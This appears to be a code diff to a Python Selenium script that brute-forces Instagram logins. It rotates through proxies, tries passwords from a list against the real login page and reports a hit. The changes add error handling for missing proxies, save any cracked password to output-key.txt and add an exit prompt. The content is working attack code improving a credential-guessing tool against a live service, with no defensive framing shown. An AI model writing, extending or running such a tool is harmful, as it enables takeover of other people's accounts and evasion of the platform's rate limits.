@@ -68,9 +68,13 @@ def start_browsing_with_proxies(proxy_file, nameuser, pas_lis):
     current_proxy_index = 0
 
     while True:
-        proxy = proxies[current_proxy_index]
-        driver = start_firefox_with_proxy(proxy)
-        print("Proxies started✅")
+        try:
+            proxy = proxies[current_proxy_index]
+            driver = start_firefox_with_proxy(proxy)
+            print("Proxies started✅")
+        except:
+            print("ops i think you forgot proxies...")
+            exit()
 
         driver.get("https://instagram.com/accounts/login/?next=%2Flogin%2F&source=desktop_nav")
         time.sleep(2)
@@ -114,6 +118,18 @@ def start_browsing_with_proxies(proxy_file, nameuser, pas_lis):
 
             except selenium.common.exceptions.NoSuchElementException:
                 print(Fore.GREEN + "🔑🔑PASSWORD FOUND🔑🔑 : {}".format(my_list[i - 1]) + Fore.RESET)
+                with open("output-key.txt", "w") as g:
+                    g.write(my_list[i - 1])
+                    print("✅found password saved to file✅ : output-key.txt")
+
+                exti = input("do you want to go out? [Y/n] : ")
+                if exti == "Y" or exti == "y":
+                    exit()
+                elif exti == "N" or exti == "n":
+                    pass
+                else:
+                    print("⚠please write y or n⚠")
+
                 exit()
             except Exception as e:
                 print(str(e))
